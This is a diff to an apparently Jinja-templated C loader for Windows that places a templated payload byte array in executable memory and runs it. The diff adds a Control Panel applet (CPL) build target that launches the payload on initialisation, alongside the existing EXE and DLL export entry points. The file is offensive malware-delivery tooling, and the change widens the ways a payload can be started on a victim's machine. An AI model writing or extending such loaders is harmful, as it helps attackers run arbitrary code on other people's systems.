@@ -1,19 +1,20 @@
 #include <windows.h>
-#ifdef DEBUG
-    #include <stdio.h>
-    #include <debugapi.h>
-#endif
+{% if debug_mode %}
+#include <stdio.h>
+#include <debugapi.h>
+{% endif %}
 
-#ifdef DEBUG
-    char debug_buffer[512];
-    #define DEBUG_PRINT(fmt, ...) \
-        do { \
-            sprintf(debug_buffer, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
-            OutputDebugStringA(debug_buffer); \
-        } while (0)
-#else
-    #define DEBUG_PRINT(fmt, ...)
-#endif
+// Use DEBUG_PRINT macro if debug mode is selected
+{% if debug_mode %}
+char debug_buffer[512];
+#define DEBUG_PRINT(fmt, ...) \
+    do { \
+        sprintf(debug_buffer, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
+        OutputDebugStringA(debug_buffer); \
+    } while (0)
+{% else %}
+#define DEBUG_PRINT(fmt, ...) // The macro becomes nothing if debug is off
+{% endif %}
 
 // --- Bytecode Placeholder ---
 unsigned char bytecode[] = { {{ bytecode_array }} };
@@ -29,7 +30,7 @@ void* AllocateExecutableMemory(SIZE_T size);
 void ExecutePayload(void* exec_mem);
 void ResolveAPIs();
 
-// --- Main Orchestration Logic ---
+// --- Main Logic ---
 void Run() {
     void* memory_block;
     
@@ -40,7 +41,7 @@ void Run() {
     ExecutePayload(memory_block);
 }
 
-// --- Entry Point (EXE or DLL) ---
+// --- Entry Point (EXE, DLL or CPL) ---
 {% if output_format == 'dll' %}
 void WINAPI {{ export_name }}() {
     Run();
@@ -52,10 +53,29 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     }
     return TRUE;
 }
+
+{% elif output_format == 'cpl' %}
+#define CPL_INIT 1
+
+LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2) {
+    if (uMsg == CPL_INIT) {
+        Run();
+        return 1;
+    }
+    return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) { }
+    return TRUE;
+}
+
 {% else %}
 int main(int argc, char *argv[]) {
     Run();
     return 0;
 }
 {% endif %}
+
+
 
